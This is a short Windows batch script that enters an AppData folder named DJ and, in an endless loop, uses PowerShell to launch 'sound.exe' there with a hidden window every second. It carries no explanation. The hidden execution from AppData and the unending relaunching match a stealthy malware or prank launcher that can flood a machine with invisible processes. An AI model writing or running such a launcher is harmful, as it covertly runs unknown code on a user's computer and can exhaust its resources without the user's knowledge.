@echo off
cd %appdata%\DJ
:Loop
powershell -NoProfile -Command "Start-Process -FilePath '%appdata%\DJ\sound.exe' -WindowStyle Hidden"
timeout /t 1
goto Loop
